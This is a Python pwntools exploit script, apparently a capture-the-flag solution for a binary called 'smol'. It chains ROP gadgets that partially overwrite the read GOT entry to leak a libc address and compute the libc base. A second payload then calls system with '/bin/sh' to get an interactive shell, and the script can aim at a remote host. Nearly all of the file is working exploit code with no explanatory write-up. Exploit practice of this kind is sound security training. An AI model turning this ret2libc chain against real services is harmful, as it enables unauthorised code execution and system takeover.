#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('smol')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
libc = exe.libc

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *main+46
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def solve():
    offset = 12
    pop_rdi = 0x00000000004011d3 # pop rdi; ret; 
    pop_rsi_r15 = 0x00000000004011d1 # pop rsi; pop r15; ret; 
    
    payload = flat({
        offset: [
            pop_rsi_r15,
            exe.got['read'],
            b'A'*8,
            exe.plt['read'],
            pop_rdi,
            0x1,
            pop_rsi_r15,
            exe.got['read'],
            b'B'*8,
            exe.plt['read'],
            pop_rdi,
            0x0,
            exe.plt['read']+6,
            exe.sym['main']

        ]
    })

    io.send(payload)
    sleep(0.1)
    io.send(b'\x5b')
    sleep(0.1)
    read = unpack(io.recv(6).ljust(8, b'\x00'))
    libc.address = read - 0xfaa5b
    io.send(b'\x50')
    sleep(0.1)

    info("libc read leak: %#x", read)
    info("libc base: %#x", libc.address)

    sh = libc.address + 0x19904f
    system = libc.address + 0x4f920
    ret = 0x000000000040101a # ret; 

    payload = b'B'*offset + p64(pop_rdi) + p64(sh) + p64(ret) + p64(system)
    io.send(payload)

    io.interactive()

def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()

